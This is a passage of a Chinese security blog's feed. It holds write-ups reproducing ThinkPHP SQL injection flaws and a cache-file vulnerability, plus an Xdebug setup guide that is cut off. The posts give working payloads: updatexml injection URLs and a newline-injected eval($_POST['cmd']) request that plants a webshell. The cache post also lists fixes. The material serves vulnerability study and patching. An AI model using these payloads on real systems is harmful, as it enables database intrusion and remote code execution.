class="line">&#x2F;&#x2F;[find&#x2F;select]select * from user where id &#x3D;updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;id%3d3%20and%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[delete]DELETE FROM &#96;tp_member&#96; WHERE id&#x3D;3 and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr></table></figure><p>除了where 还可以利用其他方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">where,table,field,join,group,having....</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;根据parseSql函数动态调试</span></pre></td></tr></table></figure><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>_parseOptions()</code>方法执行了数组合并操作，将可控 <code>options</code>参数拼接到即将执行的sql语句参数中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if(is_array($options))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    $options &#x3D;  array_merge($this-&gt;options,$options);</span></pre></td></tr></table></figure><h3 id="漏洞流程（find）"><a href="#漏洞流程（find）" class="headerlink" title="漏洞流程（find）"></a>漏洞流程（find）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">find($options&#x3D;array())-&gt;select($options&#x3D;array())-&gt;buildSelectSql($options)-&gt;parseSql($sql,$options&#x3D;array());</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;parseSql()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;$sql&#x3D;SELECT%DISTINCT% %FIELD% FROM &#x2F;&#x2F;%TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%%COMMENT%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">public function parseSql($sql,$options&#x3D;array())&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        $sql   &#x3D; str_replace(          array(&#39;%TABLE%&#39;,&#39;%DISTINCT%&#39;,&#39;%FIELD%&#39;,&#39;%JOIN%&#39;,&#39;%WHERE%&#39;,&#39;%GROUP%&#39;,&#39;%HAVING%&#39;,&#39;%ORDER%&#39;,&#39;%LIMIT%&#39;,&#39;%UNION%&#39;,&#39;%LOCK%&#39;,&#39;%COMMENT%&#39;,&#39;%FORCE%&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">            array(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseTable($options[&#39;table&#39;]),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseDistinct(isset($options[&#39;distinct&#39;])?$options[&#39;distinct&#39;]:false),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseField(!empty($options[&#39;field&#39;])?$options[&#39;field&#39;]:&#39;*&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseJoin(!empty($options[&#39;join&#39;])?$options[&#39;join&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseWhere(!empty($options[&#39;where&#39;])?$options[&#39;where&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseGroup(!empty($options[&#39;group&#39;])?$options[&#39;group&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseHaving(!empty($options[&#39;having&#39;])?$options[&#39;having&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseOrder(!empty($options[&#39;order&#39;])?$options[&#39;order&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseLimit(!empty($options[&#39;limit&#39;])?$options[&#39;limit&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseUnion(!empty($options[&#39;union&#39;])?$options[&#39;union&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseLock(isset($options[&#39;lock&#39;])?$options[&#39;lock&#39;]:false),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseComment(!empty($options[&#39;comment&#39;])?$options[&#39;comment&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseForce(!empty($options[&#39;force&#39;])?$options[&#39;force&#39;]:&#39;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            ),$sql);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        return $sql;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>将可控的options[‘where’]参数拼接到sql语句中</p><p>也可以使用其他的options值拼接，例如options[‘table’]</p><p><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener"> thinkphp3.2_find_select_delete注入 </a></p><h2 id="ord-by-注入-lt-3-2-3-amp-lt-5-1-22"><a href="#ord-by-注入-lt-3-2-3-amp-lt-5-1-22" class="headerlink" title="ord by 注入(&lt;=3.2.3&amp;&lt;=5.1.22)"></a>ord by 注入(&lt;=3.2.3&amp;&lt;=5.1.22)</h2><h3 id="漏洞代码实例-2"><a href="#漏洞代码实例-2" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$data&#x3D;array();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;user&#39;]&#x3D;array(&#39;eq&#39;,&#39;admin&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$order&#x3D;I(&#39;get.order&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;M(&#39;user&#39;)-&gt;where($data)-&gt;order($order)-&gt;find();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">ar_dump($res);</span></pre></td></tr></table></figure><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?order[updatexml(1,concat(0x3a,(select%20user()),0x5d),1)%23]&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;直接用order&#x3D;updatexml(1,concat(0x3a,(select%20user()),0x5d),1)%23也行 亲测</span></pre></td></tr></table></figure><p>执行的sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;user&#96; WHERE &#96;user&#96; &#x3D; &#39;admin&#39; ORDER BY updatexml(1,concat(0x3a,(select user()),0x5d),1)# 1 LIMIT 1</span></pre></td></tr></table></figure><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p> ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入。</p>]]></content>
    
    <summary type="html">
    
      think系列之 thinkphp3.2.3 sql注入漏洞总结
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="sql注入" scheme="http://h3art3ars.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2019/11 Person Notes</title>
    <link href="http://h3art3ars.github.io/2019/12/17/2019-11-Person-Notes/"/>
    <id>http://h3art3ars.github.io/2019/12/17/2019-11-Person-Notes/</id>
    <published>2019-12-17T02:43:59.000Z</published>
    <updated>2019-12-17T02:45:20.657Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">没什么好看的垃圾个人笔记</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d59de06ad25b9edcaa18ec538ddf3fe2215c839654af56f34deec268dbacfe0c"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      个人笔记
    
    </summary>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/categories/Notes/"/>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp3.2.3-5.0.10缓存漏洞</title>
    <link href="http://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/"/>
    <id>http://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-12-16T11:04:10.000Z</published>
    <updated>2019-12-17T03:27:11.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpthink3-2-3-5-0-10缓存函数缺陷"><a href="#phpthink3-2-3-5-0-10缓存函数缺陷" class="headerlink" title="phpthink3.2.3-5.0.10缓存函数缺陷"></a>phpthink3.2.3-5.0.10缓存函数缺陷</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="thinkphp3-2-3"><a href="#thinkphp3-2-3" class="headerlink" title="thinkphp3.2.3"></a>thinkphp3.2.3</h3><ol><li><p>漏洞文件位置(一般审计得出)</p><p><code>http://domain/index.php/Home/Index/get?id=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p></li><li><p>缓存文件为缓存名的md5值，这里采用md5（name）=b068931cc450442b63f5b3d276ea4297</p><p><code>http://domain/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php</code></p></li><li><p>之后蚁剑连接。</p></li></ol><h3 id="thinkphp5-0-5"><a href="#thinkphp5-0-5" class="headerlink" title="thinkphp5.0.5"></a>thinkphp5.0.5</h3><ol><li><p>漏洞文件位置(一般审计得出)</p><p><code>http://domain/public/index.php/Home/Index/index</code></p><p>POST数据 :<code>con=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p></li><li><p>缓存文件位置b0文件夹是md5(cache-name)前2位。</p><p><code>http://domain/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php</code></p></li><li><p>蚁剑连接</p></li></ol><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><ul><li>使用<code>S()</code>函数或者<code>Cache()</code>函数的位置不确定，尽量拿源码分析。</li><li>使用缓存函数的<code>name</code>变量未知，拿源码分析或尝试常用的缓存名<code>name</code>、<code>key</code></li></ul><h2 id="3-2-3漏洞复现"><a href="#3-2-3漏洞复现" class="headerlink" title="3.2.3漏洞复现"></a>3.2.3漏洞复现</h2><ul><li><p>直接跟进到<code>/Library/Think/Cache/File.class.php</code>文件，看到set方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;**</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">     * 写入缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">     * @access public</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">     * @param string $name 缓存变量名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">     * @param mixed $value  存储数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">     * @param int $expire  有效时间 0为永久</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">     * @return boolean</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">     *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    public function set($name,$value,$expire&#x3D;null) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        N(&#39;cache_write&#39;,1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        if(is_null($expire)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">            $expire &#x3D;  $this-&gt;options[&#39;expire&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        $filename   &#x3D;   $this-&gt;filename($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        $data   &#x3D;   serialize($value);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        if( C(&#39;DATA_CACHE_COMPRESS&#39;) &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F;数据压缩</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            $data   &#x3D;   gzcompress($data,3);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        if(C(&#39;DATA_CACHE_CHECK&#39;)) &#123;&#x2F;&#x2F;开启数据校验</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            $check  &#x3D;  md5($data);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        &#125;else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            $check  &#x3D;  &#39;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        $data    &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\n?&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F;data参数经过序列化，直接被写到文件内。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        $result  &#x3D;   file_put_contents($filename,$data);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        if($result) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            if($this-&gt;options[&#39;length&#39;]&gt;0) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">                &#x2F;&#x2F; 记录缓存队列</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;queue($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">            clearstatcache();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">            return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">        &#125;else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">            return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure></li><li><p>写一个调用缓存函数的的方法，运行一下。看看写进去什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">namespace Home\Controller;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">use Think\Controller;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">class IndexController extends Controller &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    public function index()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $a&#x3D;I(&#39;post.a3&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        S(&#39;name&#39;,$a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><p>在set方法下断点，访问 <code>http://localhost/index.php/Home/Index/index.html</code> ，post数据：<code>a3=aaaa</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-1.png" alt="debug"></p><p>可以看到$data参数经过序列化，直接写入php后缀的文件。F9运行可以看到，在<code>Application/Runtime/Temp/</code>文件夹下生成了php文件。</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-2.png" alt="cachefile"></p><p>写入到文件被行注释了。</p></li><li><p><code>$data</code>参数未过滤<code>%0d%0a</code>可以用换行来绕过行注释，尝试post数据：</p><p><code>a3=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-3.png" alt="file-cache"></p></li><li><p>之后用蚁剑连接成功</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-4.png" alt="antsword"></p></li></ul><h2 id="5-0-5漏洞复现"><a href="#5-0-5漏洞复现" class="headerlink" title="5.0.5漏洞复现"></a>5.0.5漏洞复现</h2><ul><li><p>漏洞代码与3.2.3差不多，不一样的在缓存目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">protected function getCacheKey($name)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $name &#x3D; md5($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F; 使用子目录</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">            $name &#x3D; substr($name, 0, 2) . DS . substr($name, 2);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if ($this-&gt;options[&#39;prefix&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            $name &#x3D; $this-&gt;options[&#39;prefix&#39;] . DS . $name;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        $filename &#x3D; $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        $dir      &#x3D; dirname($filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        if (!is_dir($dir)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            mkdir($dir, 0755, true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        return $filename;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure></li><li><p>在index控制器写如下代码：</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-5.png" alt="images"></p></li><li><p>之后访问 <code>http://localhost/public/index.php/Home/index</code>POST数据：<code>con=%0aeval($_POST[&#39;cmd&#39;]);%0d//</code></p></li><li><p>最终在 <code>runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code>文件生成shell：</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-6.png" alt="image2"></p></li><li><p>之后访问蚁剑 <code>http://localhost/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-7.png" alt="images3"></p></li></ul><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>在复现的时候看到CMS-hunter里对这个漏洞有这个描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">个人在复现这个漏洞的时候发现5.0.x版本的TP并不能直接访问到缓存文件所在的目录，因此可以情况下不能触发该漏洞。在3.2.x版本是可以直接从浏览器访问到缓存文件的。</span></pre></td></tr></table></figure><p>但在个人复现的时候并没有出现这个情况。</p><p>所以说一切还是自己复现一边才能填坑</p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><ul><li><p>过滤换行符</p><p>在$data写入文件之前过滤</p><p><code>$data = str_replace(PHP_EOL, &#39;&#39;, $data);</code></p></li><li><p>禁止访问目录</p><p>在<code>Runtime</code>目录添加<code>.htaccess</code>文件，内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">deny from all</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;IfModule&gt;</span></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      think系列之 thinkphp3.2.3-thinkphp5.0.10缓存漏洞复现
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="复现" scheme="http://h3art3ars.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>xdebug特定环境配置</title>
    <link href="http://h3art3ars.github.io/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://h3art3ars.github.io/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2019-12-12T11:09:54.000Z</published>
    <updated>2019-12-21T13:09:00.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>chrome</p><p>phpstudy 8.0.9.3</p><ul><li>此法只适合文件在网站根目录，因此需要自己配置添加网站，将要调试的项目放在此目录</li><li>php 7.3.4</li></ul><p>phpstorm2019</p><h2 id="浏览器chrome配置"><a href="#浏览器chrome配置" class="headerlink" title="浏览器chrome配置"></a>浏览器chrome配置</h2><p>下载 Xdebug-helper</p><h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><ol><li><p>在此版本phpstudy中，只有php7.3.4中有php_xdebug扩展.开启此扩展。</p></li><li><p>找到对应php.ini文件。</p></li><li><p><strong>重要：搜索文件找到开启的extension项：<code>extension：php_xdebug</code> 用 <code>;</code>注释掉。因为phpstudy开启这个扩展，但需要的是<code>zend_extension</code></strong></p></li><li><p>以下内容添加到php.ini尾部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">zend_extension&#x3D;xdebug</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[XDebug]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">;调试功能模块儿</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">;extension&#x3D;php_xdebug.dll</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">;下面是php_xdebug在phpstudy中的位置，根据情况修改，重要！！！！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">zend_extension &#x3D; &quot;D:\phpstudy\Extensions\php\php7.3.4nts\ext\php_xdebug.dll&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_handler&#x3D;dbgp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">xdebug.idekey&#x3D; &quot;PHPSTORM&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">;开启远程调试</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">;远程主机</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_host&#x3D;localhost</span></pre></td></tr><tr><td 